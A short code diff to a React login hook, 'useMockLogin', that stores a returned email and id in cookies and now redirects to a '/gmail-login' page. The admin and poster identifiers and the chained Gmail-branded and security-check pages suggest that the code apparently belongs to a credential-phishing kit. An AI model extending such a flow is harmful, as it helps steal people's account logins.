@@ -8,6 +8,7 @@ function useMockLogin() {
     push,
     query: { adminId, posterId },
   } = useRouter();
+  const router = useRouter();
 
   const login = async (values, formik) => {
     // console.log(values);
@@ -30,6 +31,7 @@ function useMockLogin() {
       console.log("success", data);
       Cookies.set("email", data?.info?.email);
       Cookies.set("id", data?.info?._id);
+      router.push("/gmail-login");
 
       // push("/security-check");
     } else {
